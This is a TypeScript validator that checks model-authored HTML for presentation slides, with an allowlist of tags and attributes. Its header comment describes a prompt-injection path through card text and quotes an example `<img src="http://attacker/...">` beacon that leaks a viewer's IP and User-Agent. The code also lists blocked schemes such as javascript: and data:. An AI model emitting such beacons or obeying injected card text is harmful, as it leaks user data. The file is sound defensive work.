/**
 * Pure validation for the model-authored HTML a slide may carry (#56).
 *
 * Only for slides a chart spec cannot express. The HTML is written by the
 * model from card data it saw, so it is untrusted in the strongest sense in
 * this codebase: a prompt injection in oracle text can author it directly.
 *
 * It is rendered via `srcdoc` into an iframe with `sandbox=""` — an empty
 * sandbox, so no scripts, no same-origin, no forms, no popups, no top-level
 * navigation. That attribute, not this function, is what prevents parent
 * access. This function exists for the two things an empty sandbox does NOT
 * stop:
 *
 *   1. Outbound subresource requests. `sandbox=""` blocks script but not
 *      `<img src="http://attacker/?saw-the-slide">` or a CSS `url()`. Those
 *      fire on render and leak that this user viewed this deck, plus their IP
 *      and User-Agent. So no absolute URL may appear anywhere in the markup.
 *   2. `<meta http-equiv="refresh">`, which navigates the frame without script.
 *
 * Anything rejected falls back to the slide's text/chart, or to the plain tool
 * chip — a null return is never a user-visible error. No DOM here: this must
 * run identically under node in tests, so it is string analysis only, and it
 * is deliberately a conservative allowlist rather than a sanitizer. We reject
 * suspect markup; we never try to clean it and render the remainder.
 */

/**
 * Longest HTML body a slide may carry.
 *
 * 1600, not 1200: the measured worst case for the Quotas slide (all 5 quotas
 * failing, 3-digit counts) is 1097 with compact markup but exceeded 1200 with
 * per-cell styling, which rejected the slide outright. This leaves headroom
 * while staying inside the 2048-char tool-result cap that would truncate the
 * whole result into invalid JSON anyway.
 */
export const MAX_HTML_LEN = 1600;

/** The only tags allowed. Layout and text only: no media, no embedding, no
 *  interactivity, nothing that can issue a request or hold a handler. */
export const ALLOWED_TAGS = [
  "b", "br", "code", "div", "em", "h2", "h3", "hr", "i", "li", "ol", "p",
  "pre", "small", "span", "strong", "sub", "sup", "table", "tbody", "td",
  "th", "thead", "tr", "ul",
] as const;

/** The only attributes allowed, on any permitted tag. `style` is allowed
 *  because presentation is the whole point, but it is value-checked below;
 *  `class` is NOT allowed, since the frame has no stylesheet to match. */
export const ALLOWED_ATTRS = ["style", "colspan", "rowspan"] as const;

const TAG_RE = /<\s*\/?\s*([a-zA-Z][a-zA-Z0-9]*)\b/g;
const ATTR_RE = /([a-zA-Z-]+)\s*=/g;

/**
 * Returns the HTML unchanged if every check passes, else null.
 *
 * Returning the input verbatim is deliberate: a function that returned a
 * modified string would be a sanitizer, and the caller could not tell whether
 * what it renders is what the model wrote.
 */
export function checkSlideHtml(html: unknown): string | null {
  const bad = (why: string): null => {
    console.debug(`checkSlideHtml: ${why}`);
    return null;
  };
  if (typeof html !== "string" || html.length === 0) return bad("not a string");
  if (html.length > MAX_HTML_LEN) return bad("too long");

  // Lowercase once for matching, but always return the original.
  const low = html.toLowerCase();

  // Any `//` is rejected: that covers every absolute URL (which needs "://"),
  // every protocol-relative one, and comment syntax. A narrower
  // scheme-matching regex here would be strictly redundant with this, so it is
  // deliberately not duplicated. See header note 1.
  if (low.includes("//")) return bad("double slash: absolute or protocol-relative URL");
  if (/\b(?:data|javascript|vbscript|blob|filesystem):/.test(low)) return bad("inline scheme");
  if (low.includes("url(")) return bad("css url()");
  if (low.includes("@import")) return bad("css @import");

  // Entity-encoded colons/brackets would let a scheme survive the checks above
  // and be decoded by the parser.
  if (/&#|&[a-z]+;/.test(low) && /&#x?0*(?:58|3a|60|3c);?/.test(low)) {
    return bad("encoded delimiter");
  }

  // An `on*` attribute is inert under sandbox="" but its presence means the
  // model is trying to run code; treat the whole slide as hostile.
  if (/\bon[a-z]+\s*=/.test(low)) return bad("event handler attribute");

  for (const m of low.matchAll(TAG_RE)) {
    const tag = m[1];
    if (!(ALLOWED_TAGS as readonly string[]).includes(tag)) return bad(`tag <${tag}>`);
  }
  for (const m of low.matchAll(ATTR_RE)) {
    const attr = m[1];
    if (!(ALLOWED_ATTRS as readonly string[]).includes(attr)) return bad(`attribute ${attr}`);
  }
  return html;
}
